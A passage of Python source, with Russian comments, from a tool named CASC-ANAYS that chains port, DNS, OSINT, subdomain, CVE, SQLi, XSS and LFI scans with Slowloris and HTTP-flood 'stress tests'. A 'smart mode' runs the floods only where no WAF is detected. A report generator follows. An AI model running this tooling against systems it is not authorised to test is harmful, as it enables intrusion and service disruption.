        self.repo_manager = RepoManager(self.config, self.logger, base_dir=base_dir)

        # Состояние
        self.state = AppState()

        # Модули анализа
        timeout = self.config.get_timeout()
        self.port_scanner = PortScanner(self.logger)
        self.http_analyzer = HTTPAnalyzer(
            self.logger,
            timeout=timeout,
            follow_redirects=self.config.get('settings.follow_redirects', True),
            verify_ssl=self.config.get('settings.verify_ssl', False),
        )
        self.dns_analyzer = DNSAnalyzer(self.logger)
        self.osint_module = OSINTModule(self.logger)
        self.subdomain_module = SubdomainModule(
            self.logger,
            self.repo_manager,
            max_subdomains=self.config.get('settings.max_subdomains', 500),
        )
        self.cve_scanner = CVEScanner(self.logger)
        self.nikto_scanner = NiktoScanner(self.logger, self.repo_manager)
        self.sqli_scanner = SQLiScanner(self.logger, timeout=timeout)
        self.xss_scanner = XSSScanner(self.logger, timeout=timeout)
        self.lfi_scanner = LfiScanner(self.logger, timeout=timeout)
        self.stress_tester = StressTester(self.logger, self.repo_manager)

        # Цели и результаты
        self.targets: List[Target] = []
        self.results: Dict[str, Dict[str, Any]] = {}

        # Синхронизация
        self._lock = threading.Lock()

        # Загружаем цели из конфига
        self._load_targets_from_config()

    # ==========================================================================
    # ИНИЦИАЛИЗАЦИЯ
    # ==========================================================================
    def _load_targets_from_config(self):
        """Загружает цели из config.json"""
        for t in self.config.list_targets():
            try:
                target_obj = Target(t)
                if target_obj.is_valid():
                    self.targets.append(target_obj)
            except Exception as e:
                self.logger.warning(f"Не удалось загрузить цель {t}: {e}")

    # ==========================================================================
    # РАБОТА С ЦЕЛЯМИ
    # ==========================================================================
    def add_target(self, target: str) -> bool:
        """Добавляет цель"""
        try:
            target_obj = Target(target)
        except Exception as e:
            self.logger.error(f"Ошибка парсинга цели {target}: {e}")
            return False

        if not target_obj.is_valid():
            self.logger.error(f"Неверная цель: {target}")
            return False

        # Проверка на дубликат
        if any(t.hostname == target_obj.hostname for t in self.targets):
            self.logger.warning(f"Цель уже добавлена: {target_obj.hostname}")
            return False

        self.targets.append(target_obj)
        self.config.add_target(target_obj.hostname)
        self.logger.info(f"Цель добавлена: {target_obj}")
        return True

    def remove_target(self, target: str) -> bool:
        """Удаляет цель"""
        for i, t in enumerate(self.targets):
            if t.hostname == target or t.original == target:
                del self.targets[i]
                self.config.remove_target(target)
                self.logger.info(f"Цель удалена: {target}")
                return True
        self.logger.warning(f"Цель не найдена: {target}")
        return False

    def clear_targets(self):
        """Очищает все цели"""
        self.targets.clear()
        self.config.clear_targets()

    def list_targets(self) -> List[str]:
        """Список целей в виде строк"""
        return [str(t) for t in self.targets]

    def get_target_objects(self) -> List[Target]:
        """Список объектов Target"""
        return list(self.targets)

    def get_target_by_name(self, name: str) -> Optional[Target]:
        """Находит Target по имени"""
        for t in self.targets:
            if t.hostname == name or t.original == name:
                return t
        return None

    # ==========================================================================
    # ИНИЦИАЛИЗАЦИЯ РЕПОЗИТОРИЕВ
    # ==========================================================================
    def init_repos(self, only: Optional[List[str]] = None,
                   skip_heavy: bool = True,
                   parallel: bool = False,
                   install_deps: bool = False) -> Dict[str, str]:
        """Обёртка над RepoManager.init_all"""
        return self.repo_manager.init_all(
            only=only,
            skip_heavy=skip_heavy,
            parallel=parallel,
            install_deps=install_deps,
        )

    # ==========================================================================
    # ПОЛНЫЙ АНАЛИЗ ЦЕЛИ
    # ==========================================================================
    def analyze_target(self, target: Target,
                       modules: Optional[List[str]] = None,
                       progress: bool = True) -> Dict[str, Any]:
        """
        Полный анализ цели

        modules — список модулей (если None — все)
        progress — показывать прогресс

        Возвращает:
        {
            "target": str,
            "hostname": str,
            "ip": str,
            "timestamp": str,
            "status": "completed" | "partial" | "failed",
            "modules": {
                "ports": {...},
                "http": {...},
                "dns": {...},
                "osint": {...},
                "subdomains": {...},
                "vuln": {...},
                "stress": {...},
            },
            "duration": float,
        }
        """
        if modules is None:
            modules = list(self.ALL_MODULES)

        # Валидация модулей
        modules = [m for m in modules if m in self.ALL_MODULES]

        result = {
            "target": target.original,
            "hostname": target.hostname,
            "ip": target.ip,
            "timestamp": datetime.now().isoformat(),
            "status": "pending",
            "modules": {},
            "duration": 0.0,
            "errors": [],
        }

        start = time.time()

        # Баннер
        self.logger.info("=" * 60)
        self.logger.info(f"АНАЛИЗ: {target}")
        if target.ip and target.hostname != target.ip:
            self.logger.info(f"IP: {target.ip}")
        self.logger.info(f"Модули: {', '.join(modules)}")
        self.logger.info("=" * 60)

        # HTTP-результат нужен некоторым модулям (для CVE)
        http_result: Optional[Dict[str, Any]] = None

        # ---------- 1. Порты ----------
        if "ports" in modules and not is_shutdown_requested():
            self.logger.info("[1/7] Сканирование портов...")
            try:
                r = self.port_scanner.scan(target)
                result["modules"]["ports"] = r
                self.logger.success(
                    f"    Открыто портов: {r.get('open_count', 0)} "
                    f"({Utils.format_duration(r.get('duration', 0))})"
                )
            except Exception as e:
                err = f"ports: {e}"
                result["errors"].append(err)
                self.logger.error(f"    {err}")

        # ---------- 2. HTTP ----------
        if "http" in modules and not is_shutdown_requested():
            self.logger.info("[2/7] HTTP-анализ...")
            try:
                r = self.http_analyzer.analyze(target)
                http_result = r
                result["modules"]["http"] = r

                server = r.get("server") or "N/A"
                waf = r.get("waf") or "Нет"
                status = r.get("status_code") or "N/A"

                self.logger.success(f"    Server: {server}")
                self.logger.success(f"    Status: {status}")
                self.logger.success(f"    WAF: {waf}")

                if r.get("ssl"):
                    ssl_info = r["ssl"]
                    days = ssl_info.get("days_left")
                    self.logger.success(f"    SSL: действует ещё {days} дн.")
            except Exception as e:
                err = f"http: {e}"
                result["errors"].append(err)
                self.logger.error(f"    {err}")

        # ---------- 3. DNS ----------
        if "dns" in modules and not is_shutdown_requested():
            self.logger.info("[3/7] DNS-анализ...")
            try:
                r = self.dns_analyzer.analyze(target)
                result["modules"]["dns"] = r
                self.logger.success(
                    f"    Записей: {len(r.get('records', {}))}"
                )
            except Exception as e:
                err = f"dns: {e}"
                result["errors"].append(err)
                self.logger.error(f"    {err}")

        # ---------- 4. OSINT ----------
        if "osint" in modules and not is_shutdown_requested():
            self.logger.info("[4/7] OSINT / WHOIS...")
            try:
                r = self.osint_module.analyze(target)
                result["modules"]["osint"] = r

                whois = r.get("whois", {})
                registrar = whois.get("registrar") or "N/A"
                self.logger.success(f"    Registrar: {registrar}")
            except Exception as e:
                err = f"osint: {e}"
                result["errors"].append(err)
                self.logger.error(f"    {err}")

        # ---------- 5. Поддомены ----------
        if "subdomains" in modules and not is_shutdown_requested():
            self.logger.info("[5/7] Поиск поддоменов...")
            try:
                use_bruteforce = self.config.get('settings.subdomain_bruteforce', False)
                r = self.subdomain_module.find(
                    target, use_bruteforce=use_bruteforce, use_tools=True
                )
                result["modules"]["subdomains"] = r
                self.logger.success(f"    Найдено поддоменов: {r.get('total', 0)}")
                if r.get("sources"):
                    self.logger.info(f"    Источники: {', '.join(r['sources'])}")
            except Exception as e:
                err = f"subdomains: {e}"
                result["errors"].append(err)
                self.logger.error(f"    {err}")

        # ---------- 6. Уязвимости ----------
        if "vuln" in modules and not is_shutdown_requested():
            self.logger.info("[6/7] Проверка уязвимостей...")
            vuln_results = {
                "cve": [],
                "nikto": [],
                "sqli": [],
                "xss": [],
                "lfi": [],
            }

            # CVE
            try:
                r = self.cve_scanner.scan(target, http_result=http_result)
                vuln_results["cve"] = r.get("vulnerabilities", [])
                if vuln_results["cve"]:
                    self.logger.warning(f"    CVE: {len(vuln_results['cve'])}")
            except Exception as e:
                err = f"cve: {e}"
                result["errors"].append(err)
                self.logger.error(f"    {err}")

            # Nikto (только если репо скачан)
            try:
                if self.repo_manager.has_repo("nikto"):
                    r = self.nikto_scanner.scan(target)
                    vuln_results["nikto"] = r.get("vulnerabilities", [])
                    if vuln_results["nikto"]:
                        self.logger.warning(f"    Nikto: {len(vuln_results['nikto'])}")
            except Exception as e:
                err = f"nikto: {e}"
                result["errors"].append(err)
                self.logger.debug(f"    {err}")

            # SQLi
            try:
                r = self.sqli_scanner.scan(target, http_result=http_result)
                vuln_results["sqli"] = r.get("vulnerabilities", [])
                if vuln_results["sqli"]:
                    self.logger.warning(f"    SQLi: {len(vuln_results['sqli'])}")
            except Exception as e:
                err = f"sqli: {e}"
                result["errors"].append(err)
                self.logger.error(f"    {err}")

            # XSS
            try:
                r = self.xss_scanner.scan(target)
                vuln_results["xss"] = r.get("vulnerabilities", [])
                if vuln_results["xss"]:
                    self.logger.warning(f"    XSS: {len(vuln_results['xss'])}")
            except Exception as e:
                err = f"xss: {e}"
                result["errors"].append(err)
                self.logger.error(f"    {err}")

            # LFI
            try:
                r = self.lfi_scanner.scan(target)
                vuln_results["lfi"] = r.get("vulnerabilities", [])
                if vuln_results["lfi"]:
                    self.logger.warning(f"    LFI: {len(vuln_results['lfi'])}")
            except Exception as e:
                err = f"lfi: {e}"
                result["errors"].append(err)
                self.logger.error(f"    {err}")

            result["modules"]["vuln"] = vuln_results
            total = sum(len(v) for v in vuln_results.values())
            self.logger.info(f"    Всего уязвимостей: {total}")

        # ---------- 7. Стресс-тесты ----------
        if "stress" in modules and not is_shutdown_requested():
            self.logger.info("[7/7] Стресс-тесты (малые)...")
            try:
                r = self.stress_tester.run(target)
                result["modules"]["stress"] = r

                sl = r.get("slowloris", {})
                hf = r.get("http_flood", {})

                self.logger.info(
                    f"    Slowloris: {sl.get('connections', 0)} соединений, "
                    f"{sl.get('errors', 0)} ошибок"
                )
                self.logger.info(
                    f"    HTTP-флуд: {hf.get('requests', 0)} запросов, "
                    f"{hf.get('errors', 0)} ошибок"
                )
            except Exception as e:
                err = f"stress: {e}"
                result["errors"].append(err)
                self.logger.error(f"    {err}")

        # ---------- Финал ----------
        result["duration"] = time.time() - start

        if result["errors"] and len(result["errors"]) >= len(modules) // 2:
            result["status"] = "failed"
        elif result["errors"]:
            result["status"] = "partial"
        else:
            result["status"] = "completed"

        self.state.inc_targets()

        self.logger.info("=" * 60)
        self.logger.info(
            f"ГОТОВО: {target.hostname} "
            f"({Utils.format_duration(result['duration'])}) — {result['status']}"
        )
        self.logger.info("=" * 60)

        return result

    # ==========================================================================
    # УМНЫЙ РЕЖИМ
    # ==========================================================================
    def smart_analyze(self, target: Target,
                      progress: bool = True) -> Dict[str, Any]:
        """
        Умный анализ: сначала быстрая разведка, потом — по результатам
        решаем, какие модули запускать
        """
        self.logger.info("=" * 60)
        self.logger.info(f"УМНЫЙ РЕЖИМ: {target}")
        self.logger.info("=" * 60)

        # ---------- Фаза 1: Разведка ----------
        self.logger.info("[Фаза 1] Быстрая разведка (ports, http, dns)...")
        recon = self.analyze_target(
            target,
            modules=["ports", "http", "dns"],
            progress=False,
        )

        http = recon.get("modules", {}).get("http", {})
        ports_data = recon.get("modules", {}).get("ports", {})
        ports = ports_data.get("ports", {})

        # ---------- Фаза 2: Решение ----------
        self.logger.info("[Фаза 2] Подбор модулей по результатам разведки...")

        modules = ["osint", "subdomains"]  # базовые

        # Открытые порты
        open_ports = list(ports.keys()) if isinstance(ports, dict) else []

        has_http = 80 in open_ports or 443 in open_ports or http.get("status_code")
        has_waf = bool(http.get("waf"))
        has_cloudflare = bool(http.get("has_cloudflare"))

        # Логика
        if has_http:
            modules.append("vuln")
            self.logger.info("    → есть HTTP, добавляю vuln")

        if not has_waf:
            modules.append("stress")
            self.logger.info("    → WAF не обнаружен, добавляю stress")
        else:
            self.logger.info(f"    → WAF обнаружен ({http.get('waf')}), stress пропущен")

        if has_cloudflare:
            self.logger.info("    → Cloudflare обнаружен, приоритет L7-модулям")

        # ---------- Фаза 3: Полный анализ ----------
        self.logger.info(f"[Фаза 3] Модули: {', '.join(modules)}")

        final = self.analyze_target(target, modules=modules, progress=progress)
        final["smart"] = {
            "recon_modules": ["ports", "http", "dns"],
            "chosen_modules": modules,
            "reason": {
                "has_http": has_http,
                "has_waf": has_waf,
                "has_cloudflare": has_cloudflare,
            }
        }
        return final

    # ==========================================================================
    # ЗАПУСК С ПАРАМЕТРАМИ CLI
    # ==========================================================================
    def run(self, args) -> Dict[str, Any]:
        """
        Запуск CASC-ANAYS с аргументами из argparse
        """
        self.state.start()
        self.logger.info(f"{Colors.purple('CASC-ANAYS v' + VERSION)} started")

        # ---------- Инициализация репозиториев ----------
        if getattr(args, "init_repos", False):
            self.logger.info("Инициализация репозиториев...")
            self.init_repos(
                skip_heavy=not getattr(args, "all", False),
                parallel=getattr(args, "parallel", False),
                install_deps=getattr(args, "install_deps", False),
            )

        # ---------- Цели ----------
        if getattr(args, "target", None):
            self.add_target(args.target)

        if getattr(args, "targets_file", None):
            self._load_targets_from_file(args.targets_file)

        # ---------- Модули ----------
        modules = self._resolve_modules(args)

        # ---------- Запуск анализа ----------
        if getattr(args, "full", False) or getattr(args, "smart", False):
            if not self.targets:
                self.logger.warning("Нет целей для анализа")
                return {}

            self.state.targets_total = len(self.targets)

            for i, target in enumerate(self.targets, 1):
                if is_shutdown_requested():
                    self.logger.warning("Прерывание по Ctrl+C")
                    break

                self.logger.info(f"\n[{i}/{len(self.targets)}] Обработка {target.hostname}")

                if getattr(args, "smart", False):
                    result = self.smart_analyze(target)
                else:
                    result = self.analyze_target(target, modules=modules)

                with self._lock:
                    self.results[target.original] = result

        self.state.stop()

        # ---------- Генерация отчётов ----------
        if self.results and not getattr(args, "no_report", False):
            self._generate_reports(args)

        # ---------- Итоги ----------
        self._print_summary()

        return self.results

    def _load_targets_from_file(self, path: str):
        """Загружает цели из файла"""
        if not os.path.exists(path):
            self.logger.error(f"Файл не найден: {path}")
            return

        try:
            with open(path, 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        self.add_target(line)
        except Exception as e:
            self.logger.error(f"Ошибка загрузки целей: {e}")

    def _resolve_modules(self, args) -> List[str]:
        """Определяет список модулей по аргументам CLI"""
        # Явно указанные
        if getattr(args, "modules", None):
            modules = [m.strip() for m in args.modules.split(',') if m.strip()]
        else:
            modules = list(self.ALL_MODULES)

        # Фильтры
        if getattr(args, "no_stress", False):
            modules = [m for m in modules if m != "stress"]

        if getattr(args, "no_vuln", False):
            modules = [m for m in modules if m != "vuln"]

        # Проверка
        valid = [m for m in modules if m in self.ALL_MODULES]
        invalid = [m for m in modules if m not in self.ALL_MODULES]
        if invalid:
            self.logger.warning(f"Неизвестные модули: {', '.join(invalid)}")

        return valid

    # ==========================================================================
    # ОТЧЁТЫ (обёртки — сами генераторы в part6_reports)
    # ==========================================================================
    def _generate_reports(self, args):
        """Генерирует отчёты (HTML + JSON + CSV + MD)"""
        # Эти методы будут в part6_reports.py
        try:
            # HTML
            if not getattr(args, "no_html", False):
                html_path = self.generate_report(self.results)
                self.logger.success(f"HTML-отчёт: {html_path}")
        except Exception as e:
            self.logger.error(f"HTML-отчёт: {e}")

        try:
            # JSON
            if not getattr(args, "no_json", False):
                json_path = self.generate_json_report(self.results)
                self.logger.success(f"JSON-отчёт: {json_path}")
        except Exception as e:
            self.logger.error(f"JSON-отчёт: {e}")

    # ==========================================================================
    # ИТОГИ
    # ==========================================================================
    def _print_summary(self):
        """Выводит итоговую сводку"""
        summary = self.state.summary()

        self.logger.info("")
        self.logger.info("=" * 60)
        self.logger.info("ИТОГИ")
        self.logger.info("=" * 60)
        self.logger.info(f"  Целей обработано: {summary['targets_processed']}")
        self.logger.info(f"  Всего целей:      {summary['targets_total']}")
        self.logger.info(f"  Время:            {summary['duration_str']}")

        if summary['errors']:
            self.logger.error(f"  Ошибок:           {summary['errors']}")
        if summary['warnings']:
            self.logger.warning(f"  Предупреждений:   {summary['warnings']}")

        # Статистика по уязвимостям
        total_vulns = self._count_vulns()
        if total_vulns:
            self.logger.warning(f"  Уязвимостей:      {total_vulns}")

        self.logger.info("=" * 60)

    def _count_vulns(self) -> int:
        """Считает все уязвимости во всех результатах"""
        total = 0
        for data in self.results.values():
            vuln = data.get("modules", {}).get("vuln", {})
            if isinstance(vuln, dict):
                for lst in vuln.values():
                    if isinstance(lst, list):
                        total += len(lst)
        return total

    # ==========================================================================
    # ЭКСПОРТ / ИМПОРТ РЕЗУЛЬТАТОВ
    # ==========================================================================
    def export_results(self, path: Optional[str] = None) -> str:
        """Сохраняет результаты в JSON"""
        if path is None:
            out_dir = self.config.get_output_dir()
            out_dir.mkdir(exist_ok=True)
            ts = datetime.now().strftime('%Y%m%d_%H%M%S')
            path = str(out_dir / f"results_{ts}.json")

        try:
            with open(path, 'w', encoding='utf-8') as f:
                json.dump(self.results, f, indent=4, ensure_ascii=False, default=str)
            self.logger.info(f"Результаты сохранены: {path}")
            return path
        except Exception as e:
            self.logger.error(f"Ошибка сохранения: {e}")
            return ""

    def import_results(self, path: str) -> bool:
        """Загружает результаты из JSON"""
        try:
            with open(path, 'r', encoding='utf-8') as f:
                self.results = json.load(f)
            self.logger.info(f"Результаты загружены: {path}")
            return True
        except Exception as e:
            self.logger.error(f"Ошибка загрузки: {e}")
            return False

    # ==========================================================================
    # СТАТИСТИКА
    # ==========================================================================
    def get_stats(self) -> Dict[str, Any]:
        """Возвращает статистику по результатам"""
        stats = {
            "targets": len(self.results),
            "total_ports": 0,
            "total_subdomains": 0,
            "total_vulns": 0,
            "vulns_by_severity": {
                "critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0,
            },
            "by_target": {},
        }

        for name, data in self.results.items():
            mods = data.get("modules", {})

            # Порты
            ports = mods.get("ports", {}).get("open_count", 0)
            stats["total_ports"] += ports

            # Поддомены
            subs = mods.get("subdomains", {}).get("total", 0)
            stats["total_subdomains"] += subs

            # Уязвимости
            target_vulns = 0
            vuln = mods.get("vuln", {})
            if isinstance(vuln, dict):
                for lst in vuln.values():
                    if isinstance(lst, list):
                        target_vulns += len(lst)
                        for v in lst:
                            sev = (v.get("severity") or "info").lower()
                            if sev in stats["vulns_by_severity"]:
                                stats["vulns_by_severity"][sev] += 1

            stats["total_vulns"] += target_vulns
            stats["by_target"][name] = {
                "ports": ports,
                "subdomains": subs,
                "vulns": target_vulns,
            }

        return stats

    # ==========================================================================
    # СЕРВИСНЫЕ МЕТОДЫ
    # ==========================================================================
    def reload_config(self):
        """Перезагружает конфиг"""
        self.config = Config(self.config.config_path)
        self.logger.set_level(self.config.get_log_level())
        self.logger.info("Конфиг перезагружен")

    def set_log_level(self, level: str):
        """Меняет уровень логирования"""
        self.logger.set_level(level)
        self.config.set('settings.log_level', level.upper())

    def is_module_available(self, module: str) -> bool:
        """Проверяет, доступен ли модуль"""
        return module in self.ALL_MODULES

    def __enter__(self):
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        # Сохраняем результаты, если есть
        if self.results:
            try:
                self.export_results()
            except Exception:
                pass

    def __repr__(self):
        return (
            f"<CascAnalys targets={len(self.targets)} "
            f"results={len(self.results)} "
            f"repos={len(self.repo_manager.repos)}>"
        )


# ==============================================================================
# ФАБРИКА
# ==============================================================================
def create_app(config_path: str = "config.json") -> CascAnalys:
    """Удобная фабрика CascAnalys"""
    return CascAnalys(config_path)


# ==============================================================================
# КОНЕЦ PART 5
# ==============================================================================
# В следующей части (part6_reports.py):
#   - generate_report()      — HTML-отчёт (фиолетовая тема)
#   - generate_json_report() — JSON-отчёт
#   - generate_csv_report()  — CSV-отчёт
#   - generate_markdown_report() — Markdown-отчёт
#   - class InteractiveMode  — интерактивный режим
#   - монkey-patch методов в CascAnalys
# ==============================================================================# ==============================================================================
# PART 6 — ОТЧЁТЫ И ИНТЕРАКТИВНЫЙ РЕЖИМ
# HTML, JSON, CSV, Markdown + InteractiveMode
# ==============================================================================
# Требует: part1_core.py … part5_integration.py
# ==============================================================================

import os
import sys
import json
import csv
import io
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional, Any


# ==============================================================================
# ГЕНЕРАТОР HTML-ОТЧЁТА (фиолетовая тема)
# ==============================================================================
class HTMLReportGenerator:
    """
    Генерирует красивый HTML-отчёт с фиолетовой темой CASC-ANAYS
    """

    CSS = """
    :root {
        --bg: #0A0A0A;
        --card: #1A1A2E;
        --card-2: #16162A;
        --purple: #6C3CE1;
        --light-purple: #A855F7;
        --pale-purple: #D8B4FE;
        --text: #E0E0E0;
        --dim: #888;
        --green: #10B981;
        --red: #EF4444;
        --yellow: #F59E0B;
        --blue: #3B82F6;
    }

    * { margin: 0; padding: 0; box-sizing: border-box; }

    body {
        font-family: 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
        background: var(--bg);
        color: var(--text);
        line-height: 1.6;
        padding: 20px;
    }

    .container { max-width: 1200px; margin: 0 auto; }

    .header {
        text-align: center;
        padding: 40px 0;
        border-bottom: 2px solid var(--purple);
        margin-bottom: 30px;
    }

    .logo {
        font-size: 32px;
        font-weight: bold;
        color: var(--purple);
        margin-bottom: 10px;
        letter-spacing: 3px;
    }

    .subtitle { color: var(--pale-purple); font-size: 14px; letter-spacing: 1px; }

    .timestamp {
        color: var(--light-purple);
        font-size: 13px;
        margin-top: 10px;
    }

    .stats {
        display: grid;
        grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
        gap: 15px;
        margin: 20px 0 30px;
    }

    .stat {
        background: var(--card);
        border: 1px solid var(--purple);
        border-radius: 8px;
        padding: 15px;
        text-align: center;
        transition: transform 0.2s;
    }

    .stat:hover { transform: translateY(-2px); }

    .stat .num {
        font-size: 28px;
        font-weight: bold;
        color: var(--light-purple);
    }

    .stat .label {
        font-size: 12px;
        color: var(--pale-purple);
        margin-top: 5px;
        text-transform: uppercase;
        letter-spacing: 1px;
    }

    .card {
        background: var(--card);
        border: 1px solid var(--purple);
        border-radius: 10px;
        padding: 25px;
        margin-bottom: 20px;
        box-shadow: 0 0 20px rgba(108, 60, 225, 0.15);
    }

    .card h2 {
        color: var(--light-purple);
        font-size: 20px;
        margin-bottom: 15px;
        padding-bottom: 10px;
        border-bottom: 1px solid var(--purple);
        display: flex;
        align-items: center;
        gap: 10px;
    }

    .card h3 {
        color: var(--pale-purple);
        font-size: 15px;
        margin: 15px 0 10px;
    }

    .target {
        background: linear-gradient(135deg, var(--purple), var(--light-purple));
        padding: 20px;
        border-radius: 8px;
        margin-bottom: 20px;
        box-shadow: 0 5px 20px rgba(108, 60, 225, 0.4);
    }

    .target h3 {
        font-size: 24px;
        color: white;
        margin: 0 0 5px;
    }

    .target .ip { color: var(--pale-purple); font-size: 14px; }

    .target .status {
        display: inline-block;
        margin-top: 10px;
        padding: 3px 10px;
        background: rgba(0,0,0,0.3);
        border-radius: 12px;
        font-size: 11px;
        color: white;
        text-transform: uppercase;
    }

    .severity {
        display: inline-block;
        padding: 3px 10px;
        border-radius: 4px;
        font-size: 11px;
        font-weight: bold;
        text-transform: uppercase;
        letter-spacing: 0.5px;
    }

    .severity.critical { background: #7F1D1D; color: #FECACA; }
    .severity.high     { background: #991B1B; color: #FEE2E2; }
    .severity.medium   { background: #92400E; color: #FEF3C7; }
    .severity.low      { background: #065F46; color: #D1FAE5; }
    .severity.info     { background: #1E40AF; color: #DBEAFE; }

    table {
        width: 100%;
        border-collapse: collapse;
        margin: 15px 0;
    }

    th, td {
        padding: 10px 12px;
        text-align: left;
        border-bottom: 1px solid rgba(108, 60, 225, 0.3);
        font-size: 13px;
    }

    th {
        background: rgba(108, 60, 225, 0.2);
        color: var(--light-purple);
        font-weight: 600;
        text-transform: uppercase;
        font-size: 11px;
        letter-spacing: 1px;
    }

    tr:hover td { background: rgba(108, 60, 225, 0.05); }

    .port-open { color: var(--green); font-weight: bold; }
    .port-risk { color: var(--red); font-weight: bold; }

    .vuln-item {
        background: rgba(108, 60, 225, 0.1);
        border-left: 3px solid var(--light-purple);
        padding: 12px 15px;
        margin-bottom: 10px;
        border-radius: 4px;
    }

    .vuln-item.critical { border-left-color: #DC2626; }
    .vuln-item.high     { border-left-color: #EF4444; }
    .vuln-item.medium   { border-left-color: #F59E0B; }
    .vuln-item.low      { border-left-color: #10B981; }

    .vuln-item .name {
        font-weight: bold;
        color: var(--light-purple);
        margin-bottom: 5px;
        display: flex;
        align-items: center;
        gap: 10px;
    }

    .vuln-item .desc { font-size: 13px; color: var(--text); }

    .vuln-item .evidence {
        font-family: 'Courier New', monospace;
        font-size: 12px;
        color: var(--pale-purple);
        margin-top: 8px;
        padding: 6px 10px;
        background: rgba(0,0,0,0.4);
        border-radius: 4px;
        word-break: break-all;
    }

    .subdomain-list { display: flex; flex-wrap: wrap; gap: 8px; }

    .subdomain {
        background: rgba(108, 60, 225, 0.2);
        padding: 5px 12px;
        border-radius: 15px;
        font-size: 12px;
        color: var(--pale-purple);
        border: 1px solid rgba(108, 60, 225, 0.4);
    }

    .tag {
        display: inline-block;
        background: rgba(108, 60, 225, 0.2);
        color: var(--pale-purple);
        padding: 3px 10px;
        border-radius: 12px;
        font-size: 11px;
        margin: 2px;
    }

    .empty {
        color: var(--dim);
        font-style: italic;
        font-size: 13px;
        padding: 10px 0;
    }

    .footer {
        text-align: center;
        padding: 30px 0;
        color: var(--pale-purple);
        font-size: 12px;
        border-top: 1px solid var(--purple);
        margin-top: 30px;
    }

    .footer a { color: var(--light-purple); text-decoration: none; }

    .kv-grid {
        display: grid;
        grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
        gap: 10px;
    }

    .kv {
        background: rgba(108, 60, 225, 0.05);
        padding: 8px 12px;
        border-radius: 4px;
        font-size: 13px;
    }

    .kv .k { color: var(--pale-purple); font-weight: 600; }
    .kv .v { color: var(--text); }

    .ok   { color: var(--green); }
    .bad  { color: var(--red); }
    .warn { color: var(--yellow); }

    .collapsible {
        cursor: pointer;
        user-select: none;
    }

    .collapsible::before {
        content: '▸ ';
        color: var(--light-purple);
        display: inline-block;
        transition: transform 0.2s;
    }

    .collapsible.open::before { transform: rotate(90deg); }

    .collapsible-content {
        display: none;
        padding-left: 15px;
        border-left: 2px solid rgba(108, 60, 225, 0.3);
        margin-top: 10px;
    }

    .collapsible-content.open { display: block; }

    @media (max-width: 600px) {
        body { padding: 10px; }
        .logo { font-size: 24px; }
        .target h3 { font-size: 18px; }
        th, td { padding: 8px; font-size: 12px; }
    }
    """

    JS = """
    document.querySelectorAll('.collapsible').forEach(el => {
        el.addEventListener('click', () => {
            el.classList.toggle('open');
            const content = el.nextElementSibling;
            if (content) content.classList.toggle('open');
        });
    });
    """

    def __init__(self, version: str = "4.0.0", author: str = "seismon",
                 github: str = "https://github.com/seismon/casc-anays"):
        self.version = version
        self.author = author
        self.github = github

    # ---------- Публичный метод ----------
    def generate(self, results: Dict[str, Any]) -> str:
        """Генерирует полный HTML-отчёт"""
        stats = self._compute_stats(results)
        now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

        parts = [
            self._html_head(),
            self._html_header(now),
            self._html_stats(stats),
        ]

        for target_name, data in results.items():
            parts.append(self._html_target(data, target_name))

        parts.append(self._html_footer())
        parts.append(self._html_tail())

        return "".join(parts)

    # ---------- HEAD ----------
    def _html_head(self) -> str:
        return f"""<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>CASC-ANAYS — Отчёт</title>
<style>{self.CSS}</style>
</head>
<body>
<div class="container">
"""

    def _html_header(self, timestamp: str) -> str:
        return f"""
<div class="header">
    <div class="logo">CASC-ANAYS</div>
    <div class="subtitle">ГЛОБАЛЬНЫЙ АНАЛИТИЧЕСКИЙ КОМПЛЕКС</div>
    <div class="timestamp">Отчёт создан: {timestamp}</div>
</div>
"""

    def _html_footer(self) -> str:
        return f"""
<div class="footer">
    <p>CASC-ANAYS v{self.version} | Автор: {self.author}</p>
    <p>GitHub: <a href="{self.github}">{self.github}</a></p>
    <p>Лицензия: MIT</p>
</div>
"""

    def _html_tail(self) -> str:
        return f"""</div>
<script>{self.JS}</script>
</body>
</html>
"""

    # ---------- Статистика ----------
    def _compute_stats(self, results: Dict[str, Any]) -> Dict[str, int]:
        stats = {
            "targets": len(results),
            "ports": 0,
            "subdomains": 0,
            "vulns": 0,
            "critical": 0,
            "high": 0,
            "medium": 0,
            "low": 0,
            "info": 0,
        }

        for data in results.values():
            mods = data.get("modules", {})

            ports = mods.get("ports", {}).get("open_count", 0)
            stats["ports"] += ports

            subs = mods.get("subdomains", {}).get("total", 0)
            stats["subdomains"] += subs

            vuln = mods.get("vuln", {})
            if isinstance(vuln, dict):
                for lst in vuln.values():
                    if isinstance(lst, list):
                        for v in lst:
                            sev = (v.get("severity") or "info").lower()
                            if sev in stats:
                                stats[sev] += 1
                            stats["vulns"] += 1

        return stats

    def _html_stats(self, stats: Dict[str, int]) -> str:
        items = [
            ("Целей", stats["targets"]),
            ("Портов", stats["ports"]),
            ("Поддоменов", stats["subdomains"]),
            ("Уязвимостей", stats["vulns"]),
            ("Critical", stats["critical"]),
            ("High", stats["high"]),
            ("Medium", stats["medium"]),
        ]

        html = ['<div class="stats">']
        for label, num in items:
            html.append(f"""
            <div class="stat">
                <div class="num">{num}</div>
                <div class="label">{label}</div>
            </div>""")
        html.append("</div>")
        return "".join(html)

    # ---------- Одна цель ----------
    def _html_target(self, data: Dict[str, Any], target_name: str) -> str:
        hostname = data.get("hostname", target_name)
        ip = data.get("ip") or "N/A"
        status = data.get("status", "unknown")
        duration = data.get("duration", 0)

        html = [f"""
<div class="card">
    <div class="target">
        <h3>{self._esc(hostname)}</h3>
        <div class="ip">IP: {self._esc(ip)}</div>
        <div class="status">{status} · {Utils.format_duration(duration)}</div>
    </div>
"""]

        mods = data.get("modules", {})

        # Порты
        if "ports" in mods:
            html.append(self._html_ports(mods["ports"]))

        # HTTP
        if "http" in mods:
            html.append(self._html_http(mods["http"]))

        # DNS
        if "dns" in mods:
            html.append(self._html_dns(mods["dns"]))

        # OSINT
        if "osint" in mods:
            html.append(self._html_osint(mods["osint"]))

        # Поддомены
